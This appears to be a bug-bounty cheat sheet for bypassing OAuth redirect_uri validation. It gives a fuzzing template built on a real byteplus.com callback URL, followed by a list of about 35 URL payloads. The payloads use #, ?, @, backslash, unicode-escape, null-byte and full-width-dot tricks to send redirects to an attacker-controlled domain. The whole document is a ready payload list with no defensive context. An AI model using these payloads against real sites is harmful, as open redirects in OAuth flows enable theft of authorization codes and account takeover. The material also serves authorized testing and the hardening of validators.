
```
if param look like:
?redirect_uri=https%3A%2F%2Fvakaspajjjce.byteplus.com%2Fauth%2Fcallback

fuzz  like:
https%3A%2F%2FFUZZ%2Fauth%2Fcallback
```
### bypass payloads

```
https://{attacker-domain}#.{target-domian}
https://{attacker-domain}?.{target-domian}
https://{attacker-domain}//.{target-domian}
https://{attacker-domain}\.{target-domian}
https://{target-domian}-com.com
https://{attacker-domain}#@://{target-domian}
https://{attacker-domain}#https://{target-domian}
https://{attacker-domain}?https://{target-domian}
https://{attacker-domain}https://{target-domian}
https://{attacker-domain}\https://{target-domian}
https://{attacker-domain}\/.{target-domian}
https://{attacker-domain}\\https://{target-domian}
https://{attacker-domain}\u002f{target-domian}
https://{attacker-domain}\u005c{target-domian}
https://{attacker-domain}#@{target-domian}
https://{attacker-domain}\#://{target-domian}
https://{attacker-domain}{target-domian}
https://{attacker-domain}\@.{target-domian}
https://{attacker-domain}.\".{target-domian}
https://{attacker-domain}&.{target-domian}
https://{attacker-domain}\0.{target-domian}

Use in last as attacker 
https://{target-domian}.{attacker-domain}
https://{target-domian}@{attacker-domain}
https://{target-domian}@.{attacker-domain}
https://{target-domian}.@{attacker-domain}
https://{target-domian}.{attacker-domain}#https://{target-domian}
https://{target-domian}.{attacker-domain}?https://{target-domian}
https://{target-domian}.{attacker-domain}/https://{target-domian}
https://{target-domian}@{target-domian}@{attacker-domain}
https://{target-domian}-{target-domian}.{attacker-domain}
https://{target-domian}_{target-domian}.{attacker-domain}
https://{target-domian}%E3%80%82{attacker-domain}
https://{attacker-domain}%00{target-domian}
https://{attacker-domain}'.{target-domian}
```
